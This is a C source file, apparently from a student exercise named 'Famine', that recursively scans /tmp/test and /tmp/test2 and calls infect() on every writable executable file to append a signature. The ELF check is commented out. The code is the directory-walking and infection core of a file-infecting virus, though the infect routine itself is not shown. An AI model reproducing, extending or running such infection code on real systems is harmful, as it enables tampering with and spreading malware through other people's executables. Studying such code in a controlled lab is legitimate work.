#include "famine_bonus.h"

bool    check_elf(FILE *fp)
{
    unsigned char header[6];
    int ch;
    for (int i = 0; i < 5; i++)
    {
        ch = fgetc(fp);
        if (ch == EOF)
        {
            fclose(fp);
            return false;
        }
        header[i] = (unsigned char)ch;
    }
    header[5] = '\0';
    // Check ELF magic: 0x7F 'E' 'L' 'F'
    if (header[0] != 0x7F || header[1] != 'E' || header[2] != 'L' || header[3] != 'F')
        return false;
    return true;
}

void analyze_directory(const char *dirname)
{
    const char *string = "Famine version 1.0 (c)oded by fvieira-login2";
    DIR *dir = opendir(dirname);
    if (!dir)
        return;
    struct dirent *entry;
    char path[1024];
    size_t len = strlen(string) + 1;
    
    while ((entry = readdir(dir)) != NULL)
    {  
        // Skip . and ..
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;
        snprintf(path, sizeof(path), "%s/%s", dirname, entry->d_name);
        struct stat st;
        if (stat(path, &st) == -1)
        {
            perror("stat failed");
            continue;
        }
        if (S_ISDIR(st.st_mode))
        {
            //printf("[DIR ] %s\n", path);
            analyze_directory(path);
        }
        else if (S_ISREG(st.st_mode))
        {
            
            if (access(path, W_OK) == 0  && access(path, X_OK) == 0)
            {
                FILE *fp = fopen(path, "ab+");
                printf("entrei no %s\n", path);
                //if (check_elf(fp))
                //{
                    //printf("Its elf: %s\n", path);
                    if (!check_infection(fp, string, len - 1))
                        infect(fp, string, len);
                    else
                        printf("Already infected.\n");
            }
            else
                printf("NAO entrei no %s\n", path);

        }
        else
        {
            //printf("[OTHR] %s\n", path);
        }
    }
    closedir(dir);
}

void run_infection()
{
    analyze_directory("/tmp/test");
    analyze_directory("/tmp/test2");
}
